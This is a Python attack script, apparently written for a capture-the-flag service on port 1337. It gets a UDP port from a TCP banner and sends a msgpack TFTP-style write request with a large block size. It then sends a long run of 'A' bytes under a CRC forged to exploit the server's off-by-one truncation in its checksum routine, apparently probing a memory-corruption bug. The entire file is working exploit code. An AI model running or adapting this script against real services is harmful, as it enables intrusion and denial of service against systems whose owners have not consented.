#!/usr/bin/env python3

import argparse
import re
import socket
import struct
import sys
import time

import msgpack


def get_udp_port(host, tcp_port):
    io = socket.create_connection((host, tcp_port), timeout=5)
    banner = io.recv(128)
    m = re.search(rb"(\d+)", banner)
    if not m:
        raise RuntimeError(f"bad banner: {banner!r}")
    return io, int(m.group(1))


def make_udp(io):
    local_port = io.getsockname()[1]
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0", local_port))
    s.settimeout(5)
    return s


def recv_obj(sock):
    data, _ = sock.recvfrom(65535)
    return msgpack.unpackb(data, raw=False, strict_map_key=False)


def crc32_like_server(buf):
    crc = 0xFFFFFFFF
    for b in buf[1:]:
        crc = zlib_crc32_step(crc, b)
    return (~crc) & 0xFFFFFFFF


def zlib_crc32_step(crc, b):
    crc ^= b
    for _ in range(8):
        if crc & 1:
            crc = (crc >> 1) ^ 0xEDB88320
        else:
            crc >>= 1
    return crc & 0xFFFFFFFF


def crc_for_string_obj(data):
    # check_crc32 passes size = str_size + 1 to msgpack_object_print_buffer().
    # For a string object this is one byte too small for: opening quote + data + closing quote + NUL.
    # snprintf therefore truncates the payload to: opening quote + data[:-1] + NUL.
    rendered = b'"' + data[:-1]
    return crc32_like_server(rendered)


def send_wrq(sock, host, udp_port, blksize):
    pkt = [2, "x", "octet", {"blksize": blksize}, 0]
    sock.sendto(msgpack.packb(pkt, use_bin_type=True), (host, udp_port))
    return recv_obj(sock)


def send_data(sock, host, udp_port, blockno, chunk):
    crc = crc_for_string_obj(chunk)
    pkt = [3, blockno, crc, chunk.decode("latin-1")]
    raw = msgpack.packb(pkt, use_bin_type=True)
    sock.sendto(raw, (host, udp_port))
    try:
        return recv_obj(sock)
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--tcp-port", type=int, default=1337)
    parser.add_argument("--udp-port", type=int)
    parser.add_argument("--blksize", type=int, default=2048)
    parser.add_argument("--chunk-len", type=int, default=0x220)
    args = parser.parse_args()

    if args.udp_port is not None:
      io = None
      udp_port = args.udp_port
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.bind(("0.0.0.0", 0))
      sock.settimeout(5)
    else:
      io, udp_port = get_udp_port(args.host, args.tcp_port)
      sock = make_udp(io)

    print(f"udp_port={udp_port}")
    print(f"wrq={send_wrq(sock, args.host, udp_port, args.blksize)!r}")

    chunk = b"A" * args.chunk_len
    print(f"data_crc=0x{crc_for_string_obj(chunk):08x}")
    print(f"data_resp={send_data(sock, args.host, udp_port, 1, chunk)!r}")
    print("waiting_for_alarm=60s")
    time.sleep(65)
    print("done")

    if io is not None:
        io.close()
    sock.close()


if __name__ == "__main__":
    main()
